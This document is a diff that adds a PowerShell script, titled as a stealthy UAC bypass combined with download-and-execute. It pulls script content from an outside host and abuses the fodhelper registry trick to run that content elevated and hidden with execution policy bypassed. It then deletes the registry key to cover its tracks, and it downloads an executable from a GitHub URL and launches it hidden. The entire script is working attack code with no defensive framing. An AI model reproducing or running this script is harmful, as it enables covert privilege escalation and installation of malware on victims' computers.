@@ -1,0 +1,19 @@
+# Combined UAC Bypass + Download Execution Script (Stealth)
+$scriptContent = Invoke-RestMethod -Uri "https://dont.sh/"
+$tempScript = [System.IO.Path]::Combine($env:TEMP, ('bypass_{0}.ps1' -f [System.Guid]::NewGuid().ToString().Substring(0, 8)))
+Set-Content -Path $tempScript -Value $scriptContent -Force
+
+# UAC Bypass via fodhelper
+$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+New-Item -Path $regPath -Force | Out-Null
+Set-ItemProperty -Path $regPath -Name "(default)" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScript`" --silent --disable-autorun" -Force
+Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
+$fodProcess = Start-Process "fodhelper.exe" -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 3
+Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+
+# Download and execute fss.exe
+$url = 'https://raw.githubusercontent.com/mzmoi99/k/main/fss.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'temp83.exe')
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+Start-Process -FilePath $outputFile -WindowStyle Hidden
